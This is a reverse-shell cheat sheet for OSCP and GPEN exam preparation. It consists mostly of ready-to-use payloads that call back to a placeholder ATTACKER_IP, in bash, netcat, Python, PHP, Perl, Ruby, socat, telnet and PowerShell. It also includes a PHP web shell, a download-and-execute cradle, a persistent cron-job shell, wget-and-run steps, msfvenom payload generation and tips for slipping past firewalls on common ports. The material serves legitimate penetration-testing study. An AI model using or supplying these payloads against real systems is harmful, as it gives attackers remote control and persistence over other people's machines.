# Reverse Shell Cheat Sheet (OSCP / GPEN)

This cheat sheet provides a **quick reference for generating reverse shells during penetration testing** commonly required in **OSCP and GPEN exams**.

Core idea:

```
Victim connects back → Attacker listener → Interactive shell
```

Reverse shells are useful when **direct inbound connections are blocked but outbound connections are allowed**.

---

# 1. Netcat Listener (Attacker Machine)

Start a listener before triggering the reverse shell.

```bash
nc -lvnp 4444
```

Example output:

```
listening on [any] 4444 ...
```

---

# 2. Bash Reverse Shell (Linux)

Basic bash shell:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Alternative syntax:

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

---

# 3. Netcat Reverse Shell (Linux)

If `nc` supports `-e`:

```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

If `-e` is disabled:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

---

# 4. Python Reverse Shell

Python2:

```bash
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Python3:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

# 5. PHP Reverse Shell

Simple PHP reverse shell:

```php
<?php system($_GET['cmd']); ?>
```

Full reverse shell:

```php
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

# 6. Perl Reverse Shell

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

# 7. Ruby Reverse Shell

```bash
ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

# 8. Socat Reverse Shell

Listener:

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

Victim:

```bash
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash
```

---

# 9. PowerShell Reverse Shell (Windows)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}

powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

---

# 10. Windows Netcat Reverse Shell

```bash
nc.exe ATTACKER_IP 4444 -e cmd.exe
```

---

# 11. Reverse Shell Using /dev/tcp

```bash
exec 5<>/dev/tcp/ATTACKER_IP/4444
cat <&5 | while read line; do $line 2>&5 >&5; done
```

---

# 12. Reverse Shell via Telnet

Listener:

```bash
nc -lvnp 4444
```

Victim:

```bash
telnet ATTACKER_IP 4444 | /bin/bash | telnet ATTACKER_IP 4445
```

---

# 13. Stabilizing a Reverse Shell

After gaining a shell:

### Spawn a proper TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background shell:

```
CTRL + Z
```

Set terminal:

```bash
stty raw -echo
fg
```

Reset terminal:

```bash
export TERM=xterm
```

---

# 14. Upgrade Shell with Socat

Attacker:

```bash
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

Victim:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:ATTACKER_IP:4444
```

---

# 15. Web Shell to Reverse Shell

If you upload a web shell:

Example:

```
http://target/shell.php?cmd=bash+-i+>&+/dev/tcp/ATTACKER_IP/4444+0>&1
```

---

# 16. Reverse Shell with Cron Job

Add cron entry:

```bash
* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

# 17. Reverse Shell with Python HTTP Server

Host payload:

```bash
python3 -m http.server 8000
```

Victim downloads:

```bash
wget http://ATTACKER_IP:8000/shell.sh
chmod +x shell.sh
./shell.sh
```

---

# 18. Reverse Shell via Bash Script

Example script:

```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

# 19. Common Ports for Reverse Shells

Useful ports:

```
443
80
53
8080
4444
```

Using common ports may bypass firewalls.

---

# 20. Quick Reverse Shell Workflow

```
1. Start listener
2. Execute reverse shell payload
3. Receive shell
4. Stabilize shell
5. Escalate privileges
```

---

# 21. Reverse Shell Generators

Useful tools:

```
revshells.com
msfvenom
PayloadAllTheThings
```

Example:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell.elf
```

---

# 22. Troubleshooting Reverse Shells

Check:

```
Firewall blocking port
Incorrect IP
Incorrect listener
Network restrictions
```

Test connectivity:

```bash
ping ATTACKER_IP
```

---

# 23. Final Advice

Reverse shells are **one of the most important techniques in OSCP and GPEN exams**.

Always remember:

```
Get command execution → Establish reverse shell → Stabilize shell → Continue enumeration
```

Speed and reliability are critical during exams.
